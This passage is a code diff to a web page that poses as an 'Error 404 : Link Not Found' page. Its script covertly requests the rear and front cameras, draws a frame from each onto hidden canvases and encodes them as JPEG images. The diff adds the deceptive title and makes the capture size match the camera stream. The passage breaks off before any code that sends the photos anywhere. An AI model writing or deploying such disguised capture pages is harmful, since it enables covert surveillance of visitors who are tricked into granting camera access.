@@ -3,45 +3,47 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
+  <title>Error 404</title>
 </head>
 <body>
   
   <h1>Error 404 : Link Not Found</h1>
   
   <!-- Hidden canvases to capture photos -->
-  <canvas id="rearCanvas" style="display:none;" width="960" height="1280"></canvas>
-  <canvas id="frontCanvas" style="display:none;" width="960" height="1280"></canvas>
+  <canvas id="rearCanvas" style="display:none;"></canvas>
+  <canvas id="frontCanvas" style="display:none;"></canvas>
 
   <script>
     const rearCanvas = document.getElementById('rearCanvas');
     const frontCanvas = document.getElementById('frontCanvas');
     const rearContext = rearCanvas.getContext('2d');
     const frontContext = frontCanvas.getContext('2d');
-    const width = 960;  // Adjusted width for 4:3 aspect ratio
-    const height = 1280; // Adjusted height for 4:3 aspect ratio
 
     // Capture photo from a specified camera
     function capturePhoto(facingMode, canvas, context) {
       return new Promise((resolve, reject) => {
-        navigator.mediaDevices.getUserMedia({ 
+        navigator.mediaDevices.getUserMedia({
           video: { 
             facingMode: facingMode, 
-            width: { ideal: width }, 
-            height: { ideal: height } 
-          } 
+          }
         })
         .then(stream => {
           const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
 
-          setTimeout(() => {
-            context.drawImage(video, 0, 0, width, height);
-            const photo = canvas.toDataURL('image/jpeg');
-            stream.getTracks().forEach(track => track.stop()); // Stop the camera
-            resolve(photo);
-          }, 1000);
+          video.onloadedmetadata = () => {
+            // Set canvas dimensions dynamically based on the video stream size
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+              const photo = canvas.toDataURL('image/jpeg');
+              stream.getTracks().forEach(track => track.stop()); // Stop the camera
+              resolve(photo);
+            }, 1000); // Delay to ensure the video has started playing
+          };
         })
         .catch(error => {
           console.error(`Error accessing ${facingMode} camera: `, error);
